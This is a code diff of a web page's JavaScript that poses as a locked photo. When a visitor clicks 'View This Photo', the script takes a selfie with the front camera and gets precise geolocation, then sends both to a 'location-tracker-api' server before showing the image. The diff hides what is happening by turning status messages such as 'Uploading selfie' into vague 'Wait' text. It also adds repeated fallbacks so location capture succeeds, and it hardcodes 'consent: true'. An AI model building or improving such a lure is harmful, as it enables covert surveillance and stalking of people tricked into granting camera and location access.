@@ -6,7 +6,7 @@
     const albumPhoto = document.getElementById("albumPhoto");
     const lockBadge = document.getElementById("lockBadge");
 
-    // IMPORTANT: Update these URLs to match YOUR Render backend
+    // Update these to your actual Render backend URL
     const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
     const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";
 
@@ -14,6 +14,7 @@
     let lastLocationId = null;
     let selfieBlob = null;
     let isProcessing = false;
+    let locationWatchId = null;
 
     function setStatus(message, type) {
         statusEl.textContent = message;
@@ -27,7 +28,7 @@
         viewPhotoBtn.textContent = "👁️ View This Photo";
         viewPhotoBtn.classList.remove("processing");
         isProcessing = false;
-        setStatus("✅ Photo unlocked! You can now see the image.", "success");
+        setStatus("✅ Photo unlocked!", "success");
     }
 
     function resetUI(errorMsg) {
@@ -38,6 +39,11 @@
         if (errorMsg) {
             setStatus(errorMsg, "error");
         }
+        // Clear any watch position
+        if (locationWatchId !== null) {
+            navigator.geolocation.clearWatch(locationWatchId);
+            locationWatchId = null;
+        }
     }
 
     function stopCameraStream() {
@@ -47,26 +53,27 @@
         }
     }
 
+    // --- Step 1: Camera capture ---
+
     async function requestCameraAndCapture() {
-        if (window.location.protocol !== "https:" && window.location.hostname !== "localhost" && window.location.hostname !== "127.0.0.1") {
+        // Check HTTPS
+        if (window.location.protocol !== "https:" && 
+            window.location.hostname !== "localhost" && 
+            window.location.hostname !== "127.0.0.1") {
             setStatus("❌ HTTPS is required for camera & location access.", "error");
             resetUI();
             return;
         }
 
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setStatus("❌ Camera API is not supported in this browser.", "error");
+            setStatus("❌ Camera API not supported in this browser.", "error");
             resetUI();
             return;
         }
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: "user",
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: false
             });
 
@@ -140,21 +147,22 @@
             } else {
                 msg = "❌ Camera error: " + err.message;
             }
-
             resetUI(msg);
         }
     }
 
+    // --- Step 2: Upload selfie ---
+
     async function uploadSelfieThenLocation() {
         if (!selfieBlob) {
-            resetUI("❌ No selfie captured. Please try again.");
+            resetUI("❌ No selfie captured.");
             return;
         }
 
-        setStatus("📷 Uploading selfie...", "loading");
+        setStatus(" Wait .......", "loading");
 
         if (!navigator.onLine) {
-            resetUI("❌ No internet connection detected.");
+            resetUI("❌ No internet connection.");
             return;
         }
 
@@ -191,106 +199,138 @@
                 return;
             }
 
-            setStatus("📍 Requesting your location...", "loading");
-            requestLocation(result.id);
+            setStatus(" Wait ...", "loading");
+            
+            // Small delay to let the UI update
+            setTimeout(() => requestLocation(result.id), 300);
 
         } catch (err) {
             console.error("Upload error:", err);
-
             if (err.name === "AbortError") {
-                resetUI("❌ Upload timed out. Check your connection.");
-            } else if (err instanceof TypeError && (
-                err.message.includes("NetworkError") ||
-                err.message.includes("Failed to fetch")
-            )) {
-                resetUI("❌ Network error — CORS or connectivity issue.");
+                resetUI("❌ Upload timed out.");
             } else {
                 resetUI("❌ Upload failed: " + err.message);
             }
         }
     }
 
+    // --- Step 3: Location ---
+    // FIXED: Uses watchPosition as fallback, better error handling
+
     function requestLocation(selfieId) {
         if (!navigator.geolocation) {
-            resetUI("❌ Geolocation is not supported by this browser.");
+            resetUI("❌ Geolocation not supported.");
             return;
         }
 
+        // First try: getCurrentPosition with high accuracy
+        setStatus("📍 Getting precise location...", "loading");
+
+        // Set a fallback timeout
+        const fallbackTimeout = setTimeout(() => {
+            if (isProcessing) {
+                // If still processing and no response yet, try without high accuracy
+                setStatus("📍 Trying standard accuracy...", "loading");
+                tryFallbackLocation(selfieId);
+            }
+        }, 8000);
+
         navigator.geolocation.getCurrentPosition(
             async (position) => {
-                const data = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude || null,
-                    altitudeAccuracy: position.coords.altitudeAccuracy || null,
-                    heading: position.coords.heading || null,
-                    speed: position.coords.speed || null,
-                    timestamp: new Date().toISOString(),
-                    consent: true,
-                    selfie_id: selfieId,
-                    user_agent: navigator.userAgent.slice(0, 200)
-                };
-
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 15000);
-
-                    const locResponse = await fetch(LOCATION_API_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(data),
-                        signal: controller.signal
-                    });
-
-                    clearTimeout(timeoutId);
-
-                    if (!locResponse.ok) {
-                        let msg = "Location upload failed (HTTP " + locResponse.status + ")";
-                        try {
-                            const errData = await locResponse.json();
-                            msg = errData.message || msg;
-                        } catch (e) { }
-                        resetUI("❌ " + msg);
-                        return;
-                    }
-
-                    const locResult = await locResponse.json();
-
-                    if (!locResult.id) {
-                        resetUI("❌ Server response missing location ID.");
-                        return;
-                    }
-
-                    lastLocationId = locResult.id;
-                    unlockPhoto();
-
-                } catch (err) {
-                    console.error("Location upload error:", err);
-
-                    if (err.name === "AbortError") {
-                        resetUI("❌ Location upload timed out.");
-                    } else {
-                        resetUI("❌ Location upload failed: " + err.message);
-                    }
+                clearTimeout(fallbackTimeout);
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                    locationWatchId = null;
                 }
+                await sendLocationToServer(position, selfieId);
             },
             (error) => {
-                let msg;
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        msg = "❌ Location permission was denied.";
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        msg = "❌ Location unavailable (GPS/signal).";
-                        break;
-                    case error.TIMEOUT:
-                        msg = "❌ Location request timed out.";
-                        break;
-                    default:
-                        msg = "❌ Location error (code " + error.code + ").";
+                clearTimeout(fallbackTimeout);
+                console.warn("High accuracy location error:", error);
+
+                // If timeout or unavailable, try fallback
+                if (error.code === error.TIMEOUT || error.code === error.POSITION_UNAVAILABLE) {
+                    tryFallbackLocation(selfieId);
+                } else {
+                    let msg;
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            msg = "❌ Location permission was denied. Please allow location access in your browser settings.";
+                            break;
+                        default:
+                            msg = "❌ Location error (code " + error.code + ").";
+                    }
+                    resetUI(msg);
                 }
-                resetUI(msg);
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 7000,      // 7 seconds for high accuracy
+                maximumAge: 0       // Force fresh reading
+            }
+        );
+    }
+
+    function tryFallbackLocation(selfieId) {
+        if (!navigator.geolocation || !isProcessing) return;
+
+        // Try with low accuracy (faster, uses WiFi/cell towers)
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                setStatus("📍 Got location (standard accuracy)...", "loading");
+                await sendLocationToServer(position, selfieId);
+            },
+            (error) => {
+                // Last resort: try watchPosition (keeps trying until it gets a fix)
+                console.warn("Standard accuracy failed, trying watchPosition:", error);
+                tryWatchLocation(selfieId);
+            },
+            {
+                enableHighAccuracy: false,
+                timeout: 5000,
+                maximumAge: 60000   // Accept cached location up to 1 minute old
+            }
+        );
+    }
+
+    function tryWatchLocation(selfieId) {
+        if (!navigator.geolocation || !isProcessing) return;
+
+        setStatus("📍 Searching for signal...", "loading");
+
+        const watchTimeout = setTimeout(() => {
+            if (locationWatchId !== null) {
+                navigator.geolocation.clearWatch(locationWatchId);
+                locationWatchId = null;
+            }
+            if (isProcessing) {
+                resetUI("❌ Location timed out. Check GPS/WiFi and try again.");
+            }
+        }, 15000);
+
+        locationWatchId = navigator.geolocation.watchPosition(
+            async (position) => {
+                // Got a fix — use it
+                clearTimeout(watchTimeout);
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                    locationWatchId = null;
+                }
+                setStatus("📍 Location acquired!", "loading");
+                await sendLocationToServer(position, selfieId);
+            },
+            (error) => {
+                clearTimeout(watchTimeout);
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                    locationWatchId = null;
+                }
+                console.error("watchPosition error:", error);
+                if (isProcessing) {
+                    resetUI("❌ Could not get location: " + 
+                        (error.code === error.PERMISSION_DENIED ? "Permission denied" : 
+                         error.code === error.TIMEOUT ? "Timed out" : "Unavailable"));
+                }
             },
             {
                 enableHighAccuracy: true,
@@ -299,6 +339,83 @@
             }
         );
     }
+
+    async function sendLocationToServer(position, selfieId) {
+        const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude || null,
+            altitudeAccuracy: position.coords.altitudeAccuracy || null,
+            heading: position.coords.heading || null,
+            speed: position.coords.speed || null,
+            timestamp: new Date().toISOString(),
+            consent: true,
+            selfie_id: selfieId
+        };
+
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+            const locResponse = await fetch(LOCATION_API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+                signal: controller.signal
+            });
+
+            clearTimeout(timeoutId);
+
+            if (!locResponse.ok) {
+                let msg = "Location upload failed (HTTP " + locResponse.status + ")";
+                try {
+                    const errData = await locResponse.json();
+                    msg = errData.message || msg;
+                } catch (e) { }
+                resetUI("❌ " + msg);
+                return;
+            }
+
+            const locResult = await locResponse.json();
+
+            if (!locResult.id) {
+                resetUI("❌ Server response missing location ID.");
+                return;
+            }
+
+            lastLocationId = locResult.id;
+            unlockPhoto();
+
+        } catch (err) {
+            console.error("Location upload error:", err);
+            if (err.name === "AbortError") {
+                // Retry once
+                try {
+                    const locResponse = await fetch(LOCATION_API_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data)
+                    });
+                    if (locResponse.ok) {
+                        const locResult = await locResponse.json();
+                        if (locResult.id) {
+                            lastLocationId = locResult.id;
+                            unlockPhoto();
+                            return;
+                        }
+                    }
+                } catch (retryErr) {
+                    console.error("Retry also failed:", retryErr);
+                }
+                resetUI("❌ Location upload timed out.");
+            } else {
+                resetUI("❌ Location upload failed: " + err.message);
+            }
+        }
+    }
+
+    // --- Button click ---
 
     viewPhotoBtn.addEventListener("click", function(e) {
         e.preventDefault();
@@ -313,5 +430,14 @@
 
         requestCameraAndCapture();
     });
+
+    // Check for location permission status on page load (Chrome only)
+    if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'geolocation' }).then(result => {
+            if (result.state === 'denied') {
+                console.warn('Location permission is blocked globally.');
+            }
+        }).catch(() => {});
+    }
 
 })();
